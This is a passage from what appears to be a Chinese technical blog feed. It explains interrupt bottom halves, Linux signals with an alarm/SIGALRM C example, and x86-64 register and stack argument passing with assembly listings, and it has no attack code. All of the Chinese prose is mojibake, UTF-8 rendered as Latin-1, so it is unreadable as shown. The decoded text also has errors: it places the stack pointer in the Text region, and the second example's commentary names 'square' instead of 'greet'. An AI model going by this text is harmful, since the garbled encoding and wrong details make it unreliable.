<li>å½“å†…æ ¸æ‰§è¡Œä¸ŠåŠéƒ¨åˆ†æ—¶ï¼Œæ­£åœ¨æœåŠ¡çš„è¿™ä¸ªç‰¹æ®ŠIRQå°†ä¼šè¢«å¯ç¼–ç¨‹ä¸­æ–­æ§åˆ¶å™¨ç¦æ­¢ï¼Œäºæ˜¯ï¼Œè¿æ¥åœ¨åŒä¸€ä¸ª IRQ ä¸Šçš„å…¶å®ƒè®¾å¤‡å°±åªæœ‰ç­‰åˆ°è¯¥è¯¥ä¸­æ–­å¤„ç†è¢«å¤„ç†å®Œæ¯•åæœæ‰èƒ½å‘å‡º IRQ è¯·æ±‚ã€‚è€Œé‡‡ç”¨ Bottom_half æœºåˆ¶åï¼Œä¸éœ€è¦ç«‹å³å¤„ç†çš„éƒ¨åˆ†å°±å¯ä»¥æ”¾åœ¨ä¸‹åŠéƒ¨åˆ†å¤„ç†ï¼Œä»è€Œï¼ŒåŠ å¿«äº†å¤„ç†æœºå¯¹å¤–éƒ¨è®¾å¤‡çš„ä¸­æ–­è¯·æ±‚çš„å“åº”é€Ÿåº¦ã€‚</li>
<li>å¤„ç†ç¨‹åºçš„ä¸‹åŠéƒ¨åˆ†è¿˜å¯ä»¥åŒ…å«ä¸€äº›å¹¶éæ¯æ¬¡ä¸­æ–­éƒ½å¿…é¡»å¤„ç†çš„æ“ä½œï¼›å¯¹è¿™äº›æ“ä½œï¼Œå†…æ ¸å¯ä»¥åœ¨ä¸€ç³»åˆ—è®¾å¤‡ä¸­æ–­ä¹‹åé›†ä¸­å¤„ç†ä¸€æ¬¡å°±å¯ä»¥äº†ã€‚å³åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ¯æ¬¡éƒ½æ‰§è¡Œå¹¶éå¿…è¦çš„æ“ä½œå®Œå…¨æ˜¯ä¸€ç§æµªè´¹ï¼Œè€Œé‡‡ç”¨ Bottom_half æœºåˆ¶åï¼Œå¯ä»¥ç¨ç¨å»¶è¿Ÿå¹¶åœ¨åæ¥åªæ‰§è¡Œä¸€æ¬¡å°±è¡Œäº†ã€‚</li>
</ol>
<h3 id="äºŒè€…çš„å…³ç³»"><a href="#äºŒè€…çš„å…³ç³»" class="headerlink" title="äºŒè€…çš„å…³ç³»"></a>äºŒè€…çš„å…³ç³»</h3><p>å¼‚å¸¸å’Œä¸­æ–­æœ€ä¸»è¦çš„åŒºåˆ«åœ¨äºå‰è€…ç”±æŒ‡ä»¤è§¦å‘ï¼Œæ ¹æ®æŒ‡ä»¤ç»™å‡ºç±»å‹ç ï¼Œåè€…ç”± PIC ä¸ CPU å¼•è„šä¹‹é—´çš„è¿çº¿è§¦å‘ï¼Œä»æ•°æ®çº¿ä¸Šå–å¾—ç±»å‹ç ã€‚å…¶æ¬¡ï¼Œå¼‚å¸¸éƒ½æ˜¯ä¸å¯å±è”½çš„ï¼Œè€Œä¸­æ–­åˆ†ä¸ºå¯å±è”½ä¸ä¸å¯å±è”½ä¸¤ç§ã€‚</p>
<p>ç°åœ¨é€šè¿‡æ•°æ®åŒ…ä» <em>ç½‘å¡ -&gt; å†…å­˜ -&gt; ç½‘ç»œæ¨¡å— -&gt; åè®®æ ˆ</em> è¿™ä¸ªè¿‡ç¨‹ç¤ºèŒƒä¸€ä¸‹ä¸­æ–­å¤„ç†ç¨‹åºæ˜¯æ€ä¹ˆåˆ©ç”¨ç¡¬ä¸­æ–­ä¸å¼‚å¸¸å®Œæˆå·¥ä½œçš„ï¼š</p>
<p><img src="https://i.loli.net/2020/12/14/9xbd6e4Ekp72GKC.png" alt="ä¸Šåº•å¤„ç†æµç¨‹.png"></p>
<p><img src="https://i.loli.net/2020/12/14/LPI1l5CsuNMmXak.png" alt="ä¸‹åº•å¤„ç†æµç¨‹.png"></p>
<h2 id="ä¿¡å·"><a href="#ä¿¡å·" class="headerlink" title="ä¿¡å·"></a>ä¿¡å·</h2><p>æˆ‘ä»¬åœ¨è¿è¡Œä¸€ä¸ª shell ç¨‹åºçš„æ—¶å€™ï¼Œå¾€å¾€æŒ‰ä¸‹ Ctrl+C å°±å¯ä»¥å¼ºåˆ¶é€€å‡ºã€‚æŒ‰ä¸‹ç»„åˆé”®çš„è¿‡ç¨‹å°±æ˜¯æ“ä½œç³»ç»Ÿç»™è¿›ç¨‹å‘é€äº†ä¸€ä¸ªä¿¡å·ï¼š</p>
<ol>
<li>æ¾å¼€æŒ‰é”®åé”®ç›˜ä¼šäº§ç”Ÿä¸€ä¸ªä¸­æ–­ï¼Œå¦‚æœ CPU æ­£åœ¨æ‰§è¡Œè¿™ä¸ªè¿›ç¨‹çš„ä»£ç åˆ™è¯¥è¿›ç¨‹çš„ç”¨æˆ·ä»£ç å…ˆæš‚åœæ‰§è¡Œï¼Œç”¨æˆ·ä»ç”¨æˆ·æ€åˆ‡æ¢åˆ°å†…æ ¸æ€å»å¤„ç†ä¸­æ–­</li>
<li>é”®ç›˜é©±åŠ¨ç¨‹åºæ£€æµ‹åˆ°æŒ‰ä¸‹çš„æ˜¯ ctrl+cï¼Œå°†è¿™ä¸€å¯¹ç»„åˆé”®ç¿»è¯‘æˆä¸€ä¸ª SIGINT ä¿¡å·è®°åœ¨è¯¥è¿›ç¨‹çš„ PCB ä¸­ï¼ˆä¹Ÿå°±æ˜¯å‘é€äº†ä¸€ä¸ª SIGINT ä¿¡å·ç»™è¯¥è¿›ç¨‹ï¼‰</li>
<li>åœ¨ä»å†…æ ¸æ€å›åˆ°ç”¨æˆ·æ€ç»§ç»­æ‰§è¡Œè¿›ç¨‹çš„ç”¨æˆ·ä»£ç ä¹‹å‰ï¼Œé¦–å…ˆè¦å¤„ç† PCB ä¸­çš„ä¿¡å·ï¼Œè¿™æ˜¯å‘ç°æœ‰ä¸€ä¸ª SIGINT è¦å¤„ç†ï¼Œè€Œè¿™ä¸ªä¿¡å·çš„åœ¨å†…æ ¸é»˜è®¤å¤„ç†çš„æ–¹å¼æ˜¯ç»ˆæ­¢è¿›ç¨‹ï¼Œæ‰€ä»¥ç›´æ¥ç»ˆæ­¢è¿›ç¨‹ï¼Œä¸å†è¿”å›ç”¨æˆ·ç©ºé—´æ‰§è¡Œä»£ç </li>
</ol>
<p>åœ¨ bash æ‰§è¡Œ <code>kill -l</code> å¯ä»¥çœ‹åˆ°æ‰€æœ‰ä¿¡å·åŠå…¶ç¼–å·ï¼š<br><img src="https://i.loli.net/2020/12/13/aCFM9hEjfIQX3Tw.png" alt="image.png"></p>
<p>äº§ç”Ÿä¿¡å·çš„æ–¹å¼ï¼š</p>
<ol>
<li>æŒ‰ä¸‹æŸäº›ç»„åˆé”®ã€‚å¦‚ Ctrl+C äº§ç”Ÿ SIGINTï¼ŒCtrl+/ äº§ç”Ÿ SIGQUIT ï¼ŒCtrl+Z äº§ç”Ÿ SIGTSTPã€‚</li>
<li>å¼‚å¸¸äº§ç”Ÿä¿¡å·ã€‚ç”±ç¡¬ä»¶æ£€æµ‹åˆ°å¹¶é€šçŸ¥å†…æ ¸ï¼Œç„¶åå†…æ ¸å‘å½“å‰è¿›ç¨‹å‘é€é€‚å½“çš„ä¿¡å·ã€‚ä¾‹å¦‚å½“å‰è¿›ç¨‹æ‰§è¡ŒæŒ‡ä»¤ div 0ï¼ŒCPU çš„è¿ç®—å•å…ƒä¼šäº§ç”Ÿå¼‚å¸¸ï¼Œå†…æ ¸å°†è¿™ä¸ªå¼‚å¸¸è§£é‡Šä¸º SIGFPE ä¿¡å·å‘é€ç»™è¿›ç¨‹ï¼›å†æ¯”å¦‚å½“å‰è¿›ç¨‹è®¿é—®äº†éæ³•å†…å­˜åœ°å€ï¼ŒMMU ä¼šäº§ç”Ÿå¼‚å¸¸ï¼Œå†…æ ¸å°†è¿™ä¸ªå¼‚å¸¸è§£é‡Šä¸º SIGSEGV ä¿¡å·å‘é€ç»™è¿›ç¨‹ã€‚</li>
<li>è¿›ç¨‹é€šè¿‡ç³»ç»Ÿè°ƒç”¨ kill å‡½æ•°ç»™å¦ä¸€ä¸ªè¿›ç¨‹å‘é€ä¿¡å·ã€‚</li>
<li>é€šè¿‡ kill å‘½ä»¤ç»™æŸä¸ªè¿›ç¨‹å‘é€ä¿¡å·ï¼ˆå†…éƒ¨ä¹Ÿæ˜¯é€šè¿‡ç³»ç»Ÿè°ƒç”¨ kill å‡½æ•°å®ç°çš„ï¼‰</li>
<li>æŸç§ç‰¹å®šçš„è½¯ä»¶è¡Œä¸ºäº§ç”Ÿä¿¡å·ã€‚å¦‚å‘è¯»ç«¯å·²å…³é—­çš„ç®¡é“å†™æ•°æ®æ—¶äº§ç”Ÿ SIGPIPE ä¿¡å·ï¼Œæ—¶é’Ÿå‡½æ•° alarm è¶…æ—¶äº§ç”Ÿ SIGALRM ä¿¡å·</li>
</ol>
<p>ä¸¾ä¸ªä¾‹å­ï¼Œç”¨ alarm å‡½æ•°è®¾å®šä¸€ä¸ªé—¹é’Ÿï¼Œå‘Šè¯‰å†…æ ¸åœ¨ 2 ç§’åç»™å½“å‰è¿›ç¨‹å‘é€ä¸€ä¸ª SIGALRM ä¿¡å·ï¼Œè¯¥ä¿¡å·çš„é»˜è®¤å¤„ç†åŠ¨ä½œæ˜¯ç»ˆæ­¢å½“å‰è¿›ç¨‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">1</span>;</span><br><span class="line">    alarm(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">for</span> (; ; count++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;count = %d\n&quot;</span>, count);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°ï¼Œæ—¶é’Ÿè¶…æ—¶å‰ä¸€ç›´åœ¨å¯¹ count è¿›è¡Œè®¡æ•°ï¼Œ2s åè¿›ç¨‹æ”¶åˆ° SIGALRM ä¿¡å·ç»ˆæ­¢ã€‚<br><img src="https://i.loli.net/2020/12/13/vAwGdTbNH8lOSg5.png" alt="image.png"></p>
<p>ä¸‹å›¾æ€»ç»“äº†ä¿¡å·çš„æ•è·è¿‡ç¨‹ã€‚ä¸ä¸­æ–­ä¸åŒï¼Œåº”ç”¨å±‚é¢çš„å¼€å‘è€…æ˜¯å¯ä»¥æ§åˆ¶ç¨‹åºæ”¶åˆ°ä¿¡å·åçš„è¡Œä¸ºçš„ï¼š</p>
<p><img src="https://i.loli.net/2020/12/13/NRnovw1bMuG3xzs.png"></p>
<h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a href="https://blog.csdn.net/flowing_wind/article/details/79967588">Linuxè¿›ç¨‹ä¿¡å·è¯¦è§£</a></p>
<p><a href="https://www.cnblogs.com/charlesblc/p/6277810.html">ä¿¡å·å’Œä¸­æ–­çš„æ¯”è¾ƒ+ä¸­æ–­å’Œå¼‚å¸¸çš„æ¯”è¾ƒ</a></p>
<p>ã€Šæ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿã€‹ç¬¬ 8 ç« ï¼šå¼‚å¸¸æ§åˆ¶æµ</p>
]]></content>
      <categories>
        <category>è®¡ç®—æœºç³»ç»Ÿ</category>
      </categories>
      <tags>
        <tag>å¼‚å¸¸å¤„ç†</tag>
      </tags>
  </entry>
  <entry>
    <title>å‡½æ•°è°ƒç”¨èƒŒåçš„ç§˜å¯†â€”â€”å¯„å­˜å™¨ä¸æ ˆ</title>
    <url>/2020/11/21/%E4%BB%8EBP%E4%B8%8ESP%E8%AF%B4%E5%BC%80%E5%8E%BB/</url>
    <content><![CDATA[<p>å‡½æ•°è°ƒç”¨æ˜¯è§£è€¦æ€æƒ³çš„ä¸€ä¸ªåŸºæœ¬ä½“ç°ã€‚ä¸ºäº†å®ç°è°ƒç”¨ï¼Œæˆ‘ä»¬å¾€å¾€éœ€è¦ç»™å­ç¨‹åºæä¾›ä¸€äº›å‚æ•°å¹¶å¾—åˆ°å­ç¨‹åºçš„æ‰§è¡Œç»“æœã€‚ä»Šå¤©å°±æ¥æ¢ç©¶ä¸€ä¸‹è¿™ä¸ªè¿‡ç¨‹åœ¨è®¡ç®—æœºå†…éƒ¨æ˜¯å¦‚ä½•å®ç°çš„ã€‚</p>
<h2 id="ç¨‹åºå†…å­˜æ¨¡å‹"><a href="#ç¨‹åºå†…å­˜æ¨¡å‹" class="headerlink" title="ç¨‹åºå†…å­˜æ¨¡å‹"></a>ç¨‹åºå†…å­˜æ¨¡å‹</h2><p>ä¸‹å›¾å±•ç¤ºäº† x86-64 å¹³å° Linux ç³»ç»Ÿçš„ç¨‹åºå†…å­˜åˆ†å¸ƒæ¨¡å‹ã€‚OS åªä½¿ç”¨äº†ä½ 47 ä½ä½œä¸ºå†…å­˜åœ°å€ï¼Œæ‰€ä»¥å¯ä»¥çœ‹åˆ°å†…å­˜åœ°å€æœ€å¤§å€¼ä¸º <code>0x00007FFFFFFFFFF</code>ï¼š</p>
<ol>
<li>å‰ FFFFFFF ä¸ªå­—èŠ‚å­˜æ”¾å…±äº«åº“ï¼Œå¦‚ <code>stdio.h</code>ã€ <code>iostream</code> ç­‰éƒ½åœ¨è¿™é‡Œ</li>
<li>éšåä¸ºå¤§å°æœ€å¤š 8M çš„è¿è¡Œæ—¶æ ˆã€‚å±€éƒ¨å˜é‡ã€ç¨‹åºçŠ¶æ€ä¿¡æ¯ç­‰å€¼å¾€å¾€ä¿å­˜å…¶ä¸­ã€‚sp å‡å°ï¼Œæ ˆå¢å¤§ï¼›sp å¢å¤§ï¼Œæ ˆå‡å°å¹¶é‡Šæ”¾æ ˆå¸§ä¸­çš„å†…å®¹</li>
<li>å †ç©ºé—´çš„ç”³è¯·ä¸é‡Šæ”¾ç”±ç¨‹åºå‘˜æ‰‹åŠ¨ç®¡ç†</li>
<li>Data åŒºä¿å­˜å…¨å±€æ•°æ®ï¼Œé€šå¸¸æ˜¯å¸¸é‡</li>
<li>Text åŒºå­˜æ”¾ç¨‹åºæŒ‡ä»¤ï¼Œsp æŒ‡é’ˆå°±åœ¨è¿™å—åŒºåŸŸä¸­æ¥å›ç§»åŠ¨</li>
<li>ä½ 400000 å­—èŠ‚é€šå¸¸ä¸ä¼šè¢«åˆ†é…ç»™ç¨‹åº</li>
</ol>
<p><img src="https://i.loli.net/2020/12/01/tpiUYdgbZxEBVvm.png" alt="image.png"></p>
<p>**sp(stack pointer)**ï¼Œä¸­æ–‡åâ€œæ ˆé¡¶å¯„å­˜å™¨â€ã€‚é¡¾åæ€ä¹‰ï¼Œè¿™ä¸ªæŒ‡é’ˆæ—¶åˆ»æŒ‡å‘æ ˆçš„é¡¶éƒ¨ï¼Œå…¶å€¼éš push å’Œ pop æ“ä½œéšå¼æ”¹å˜ã€‚å‡è®¾æ“ä½œå¯¹è±¡ä¸º xï¼š</p>
<ul>
<li>push xï¼šé¦–å…ˆï¼Œsp -= len(x)ï¼ˆx çš„å­—é•¿ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ï¼›ç„¶åï¼Œåœ¨ [sp-len(x), sp) ä¸­å­˜å…¥ x å€¼ã€‚</li>
<li>pop xï¼šé¦–å…ˆï¼Œä» [sp-len(x), sp) ä¸­è¯»å–æ•°æ®å­˜æ”¾åˆ° xï¼›ç„¶åï¼Œsp += len(x)ã€‚</li>
</ul>
<p>å¦‚æœç¼–è¯‘å™¨èƒ½æ¨æ–­ä¸€ä¸ªå‡½æ•°è¦å ç”¨å¤šå°‘ç©ºé—´ï¼Œåœ¨è¿›å…¥è¿™ä¸ªå‡½æ•°æ—¶å¾€å¾€ä¼šä¸ºå®ƒé¢„å…ˆåˆ†é…å¥½ä¸€æ®µæ ˆç©ºé—´ï¼ˆå¦‚ä¾‹äºŒæ±‡ç¼–ä»£ç ç¬¬ 18 è¡Œ <code>sub rsp, 32</code>ï¼Œä¸º main å‡½æ•°åˆ†é…äº† 32 å­—èŠ‚æ ˆç©ºé—´ï¼‰ã€‚åœ¨è¿™ä¸ªå‡½æ•°é€€å‡ºæ—¶ï¼Œè°ƒæ•´ sp çš„å€¼é”€æ¯è¿™æ®µç©ºé—´ï¼ˆä¾‹äºŒæ±‡ç¼–ä»£ç ç¬¬ 30 è¡Œ <code>add rsp, 32</code>ï¼‰ã€‚</p>
<p>**bp(base pointer)**ï¼Œä¸­æ–‡åâ€œåŸºæŒ‡å¯„å­˜å™¨â€ã€‚å› ä¸ºéšç€æŒ‡ä»¤æ‰§è¡Œ sp æ˜¯ä¸æ–­å˜åŒ–çš„ï¼Œæ‰€ä»¥åœ¨è¿›å…¥å‡½æ•°æ—¶å¸¸ç”¨ bp ä¿å­˜ sp çš„åˆå§‹å€¼ä»¥å¯¹è¦ç”¨åˆ°çš„æ•°æ®è¿›è¡Œå¯»å€å®šä½ï¼ˆä¾‹äºŒæ±‡ç¼–ä»£ç ç¬¬ 6 è¡Œ <code>mov eax, DWORD PTR [rbp+36]</code>ï¼Œç¬¬ 21 è¡Œ <code>mov QWORD PTR [rbp-32], rax</code> ç­‰ï¼‰ã€‚</p>
<p>æŒ‡ä»¤ <code>call x</code> ä¼šè®¾ç½® ip å¯„å­˜å™¨çš„å€¼ä¸º x çš„æ®µåç§»åœ°å€ï¼Œè¾¾åˆ°â€œè°ƒç”¨å‡½æ•°â€çš„ç›®çš„ã€‚è¿™ä¸ªè¿‡ç¨‹åˆ†ä¸ºä¸¤æ­¥ï¼š</p>
<ol>
<li>æŠŠ ip å¯„å­˜å™¨çš„åŸå€å…¥æ ˆï¼ˆæ­¤æ—¶ ip æŒ‡å‘ call çš„ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼‰ï¼Œç›¸å½“äº <code>push ip</code></li>
<li>æ›´æ–° ip å¯„å­˜å™¨çš„å€¼ï¼Œç›¸å½“äº <code>mov ip, x</code></li>
</ol>
<p>æŒ‡ä»¤ <code>ret</code> ä»æ ˆé¡¶å–å€¼ä¿å­˜åˆ° ip å¯„å­˜å™¨ï¼Œç›¸å½“äº <code>call</code> çš„é€†æ“ä½œã€‚æ‰§è¡Œå®Œ ret æŒ‡ä»¤å ip æ¢å¤åˆ°å‡½æ•°è°ƒç”¨å‰çš„å€¼ï¼Œç¨‹åºä»è€Œç»§ç»­å‘ä¸‹æ‰§è¡Œã€‚</p>
<p>æŒ‡ä»¤ <code>leave</code> åœ¨å‡½æ•°æ‰§è¡Œç»“æŸåæ¢å¤ sp å’Œ bp çš„å€¼ã€‚ä¸Šæ–‡è¯´åˆ°è¿›å…¥å‡½æ•°æ—¶ä¼šæŠŠ sp ä¿å­˜åˆ° bp å†è°ƒæ•´ sp çš„å€¼ä»¥ä¸ºå‡½æ•°åˆ†é…æ ˆç©ºé—´ã€‚é‚£ä¹ˆåœ¨é€€å‡ºå‡½æ•°æ—¶è‡ªç„¶è¦æ¢å¤åŸæ¥çš„ sp å’Œ bpã€‚è¿™æ¡æŒ‡ä»¤ç›¸å½“äº <code>mov rsp, rbp</code> å’Œ <code>pop rbp</code> çš„ç»“åˆã€‚</p>
<h2 id="åˆ©ç”¨å¯„å­˜å™¨ä¼ å‚"><a href="#åˆ©ç”¨å¯„å­˜å™¨ä¼ å‚" class="headerlink" title="åˆ©ç”¨å¯„å­˜å™¨ä¼ å‚"></a>åˆ©ç”¨å¯„å­˜å™¨ä¼ å‚</h2><p>æ¥çœ‹ä¾‹ä¸€ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">square</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> num * num;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> k = <span class="number">2</span>;</span><br><span class="line">    square(k);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨ x86-64 å¹³å°ä¸Šæ±‡ç¼–å¾—åˆ°çš„ç»“æœæ˜¯è¿™æ ·çš„ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">square:</span><br><span class="line">        push    rbp</span><br><span class="line">        mov     rbp, rsp</span><br><span class="line">        mov     DWORD PTR [rbp-4], edi</span><br><span class="line">        mov     eax, DWORD PTR [rbp-4]</span><br><span class="line">        imul    eax, eax</span><br><span class="line">        pop     rbp</span><br><span class="line">        ret</span><br><span class="line">main:</span><br><span class="line">        push    rbp</span><br><span class="line">        mov     rbp, rsp</span><br><span class="line">        sub     rsp, 16</span><br><span class="line">        mov     DWORD PTR [rbp-4], 2</span><br><span class="line">        mov     eax, DWORD PTR [rbp-4]</span><br><span class="line">        mov     edi, eax</span><br><span class="line">        call    square</span><br><span class="line">        mov     DWORD PTR [rbp-4], eax</span><br><span class="line">        mov     eax, 0</span><br><span class="line">        leave</span><br><span class="line">        ret</span><br></pre></td></tr></table></figure>

<p>å˜é‡ k ä¿å­˜åœ¨å†…å­˜ <code>[rbp-4]</code> å¤„ï¼Œå…¶å€¼ä¸º 2ã€‚éšå <code>[rbp-4]</code> ä¸­çš„å€¼è¢«å­˜åˆ°äº† <code>eax</code>ï¼Œæœ€åä¿å­˜åœ¨ <code>edi</code>ï¼Œè¿™å°±å®Œæˆäº†ä¸€æ¬¡å¯„å­˜å™¨ä¼ å‚ã€‚square  å‡½æ•°æ›´æ–° <code>rbp</code> çš„å€¼å†ä» <code>edi</code> å–å€¼ä¿å­˜åˆ° <code>[rbp-4]</code>ï¼Œå®Œæˆå½¢å‚åˆ°å®å‚çš„å¤åˆ¶ã€‚square æŠŠç»“æœä¿å­˜åœ¨ <code>eax</code> é‡Œï¼Œmain è¯»å– <code>eax</code> å¾—åˆ°è°ƒç”¨è¿”å›å€¼ã€‚</p>
<h2 id="ç”¨æ ˆä¼ å‚"><a href="#ç”¨æ ˆä¼ å‚" class="headerlink" title="ç”¨æ ˆä¼ å‚"></a>ç”¨æ ˆä¼ å‚</h2><p>å½“å‚æ•°çš„æ•°é‡è¿‡å¤šæ— æ³•å…¨éƒ¨ä¿å­˜åˆ°å¯„å­˜å™¨é‡Œæˆ–é•¿åº¦è¶…è¿‡äº†æœºå™¨å­—é•¿ï¼Œå°±è¦ç”¨åˆ°æ ˆæ¥ä¼ å‚ã€‚å†æ¥çœ‹ä¾‹äºŒï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line">    <span class="keyword">int</span>  age;</span><br><span class="line">&#125;Person;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">greet</span><span class="params">(Person people)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello %s, you are %d years old.\n&quot;</span>, people.name, people.age);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Person me = &#123;name: <span class="string">&quot;Rowan&quot;</span>, age: <span class="number">21</span>&#125;;</span><br><span class="line">    greet(me);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç¿»è¯‘æˆæ±‡ç¼–è¯­è¨€æ˜¯è¿™æ ·ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.LC0:</span><br><span class="line">        .string &quot;hello %s, you are %d years old.\n&quot;</span><br><span class="line">greet:</span><br><span class="line">        push    rbp</span><br><span class="line">        mov     rbp, rsp</span><br><span class="line">        mov     eax, DWORD PTR [rbp+36]</span><br><span class="line">        mov     edx, eax</span><br><span class="line">        lea     rsi, [rbp+16]</span><br><span class="line">        mov     edi, OFFSET FLAT:.LC0</span><br><span class="line">        mov     eax, 0</span><br><span class="line">        call    printf</span><br><span class="line">        nop</span><br><span class="line">        pop     rbp</span><br><span class="line">        ret</span><br><span class="line">main:</span><br><span class="line">        push    rbp</span><br><span class="line">        mov     rbp, rsp</span><br><span class="line">        sub     rsp, 32</span><br><span class="line">        movabs  rax, 474081619794</span><br><span class="line">        mov     edx, 0</span><br><span class="line">        mov     QWORD PTR [rbp-32], rax</span><br><span class="line">        mov     QWORD PTR [rbp-24], rdx</span><br><span class="line">        mov     DWORD PTR [rbp-16], 0</span><br><span class="line">        mov     DWORD PTR [rbp-12], 21</span><br><span class="line">        sub     rsp, 8</span><br><span class="line">        push    QWORD PTR [rbp-16]</span><br><span class="line">        push    QWORD PTR [rbp-24]</span><br><span class="line">        push    QWORD PTR [rbp-32]</span><br><span class="line">        call    greet</span><br><span class="line">        add     rsp, 32</span><br><span class="line">        mov     eax, 0</span><br><span class="line">        leave</span><br><span class="line">        ret</span><br></pre></td></tr></table></figure>

<p>ä¸€ä¸ª Person å®ä¾‹å  24 å­—èŠ‚ï¼Œè¶…è¿‡äº† x86-64 å¹³å°ä¸‹ä¸€ä¸ªé€šç”¨å¯„å­˜å™¨çš„æœ€å¤§é•¿åº¦ï¼ˆ8 å­—èŠ‚ï¼‰ï¼Œç¼–è¯‘å™¨ç”¨æ ˆæ¥ä¿å­˜å‚æ•°ã€‚</p>
<p>26 åˆ° 28 è¡Œçš„ä¸‰ä¸ª <code>push</code> æ“ä½œæŠŠ me å…¥æ ˆï¼Œéšåç”¨ <code>call</code> æŒ‡ä»¤è·³åˆ° square å‡½æ•°ã€‚square å‡½æ•°åœ¨æ ˆçš„ <code>[rbp+36]</code> å–åˆ° age æˆå‘˜çš„å€¼ï¼Œå– <code>[rbp+16]</code> ï¼ˆname æˆå‘˜ï¼‰çš„å†…å­˜åœ°å€æ”¾å…¥ <code>rsi</code>ï¼Œå®Œæˆä¸€æ¬¡ä¼ å‚ã€‚</p>
<h2 id="å¦‚ä½•å®ç°å¤šè¿”å›å€¼"><a href="#å¦‚ä½•å®ç°å¤šè¿”å›å€¼" class="headerlink" title="å¦‚ä½•å®ç°å¤šè¿”å›å€¼"></a>å¦‚ä½•å®ç°å¤šè¿”å›å€¼</h2><p>å‰é¢è¯´åˆ°ï¼Œè°ƒç”¨æ–¹é€šè¿‡è¯»å– <code>eax</code> å¯„å­˜å™¨å¾—åˆ°è¢«è°ƒç”¨å‡½æ•°çš„è¿”å›å€¼ï¼Œè€Œ <code>eax</code> åªèƒ½å­˜æ”¾ä¸€ä¸ªå€¼ï¼Œé‚£ä¹ˆåƒ Golang è¿™ç§æ”¯æŒå¤šè¿”å›å€¼çš„è¯­è¨€æ˜¯å¦‚ä½•å®ç°çš„å‘¢ï¼Ÿç­”æ¡ˆå°±æ˜¯æ ˆã€‚</p>
<p>Golang ç»Ÿä¸€ç”¨æ ˆæ¥ä¼ å‚ï¼Œå‡½æ•°è°ƒç”¨å‰åœ¨è°ƒç”¨è€…æ ˆå¸§ä¸Šå°±å·²ç»é¢„å…ˆä¸ºè¿”å›å€¼åˆ†é…å¥½äº†å†…å­˜ç©ºé—´ï¼Œè¢«è°ƒç”¨å‡½æ•°åªéœ€è¦æŠŠè¿”å›å€¼ä¾æ¬¡å¡«è¿›å»å°±å¥½äº†ã€‚</p>
<p><img src="https://i.loli.net/2021/01/16/vAlpKw2HEYWcfS7.png" alt="goå‡½æ•°è°ƒç”¨å†…å­˜æ¨¡å‹.png"></p>
<p>ç»Ÿä¸€ä½¿ç”¨æ ˆä¼ å‚æœ€ç›´æ¥çš„å¥½å¤„å½“ç„¶å°±æ˜¯æ”¯æŒå¤šè¿”å›å€¼ï¼Œä»¥åŠä¾¿äºç¼–è¯‘å™¨ç”Ÿæˆæ±‡ç¼–ä»£ç äº†ã€‚ä½†æ˜¯ç›¸æ¯” C ç­‰æ”¯æŒå¯„å­˜å™¨ä¼ å‚çš„è¯­è¨€æ¥è¯´ï¼Œä¸»è¦å¼Šç«¯åœ¨äºä¼ å‚é€Ÿåº¦æ…¢ï¼Œå› ä¸º CPU è®¿é—®æ ˆçš„å¼€é”€æ¯”è®¿é—®å¯„å­˜å™¨é«˜å‡ åå€ã€‚</p>
]]></content>
      <categories>
        <category>è®¡ç®—æœºç³»ç»Ÿ</category>
      </categories>
      <tags>
        <tag>å†…å­˜æ¨¡å‹</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang å…³é”®å­— new å’Œ make æœ‰å•¥ä¸åŒ?</title>
    <url>/2020/08/03/Golang-%E5%85%B3%E9%94%AE%E5%AD%97-new-%E5%92%8C-make-%E6%9C%89%E5%95%A5%E4%B8%8D%E5%90%8C/</url>
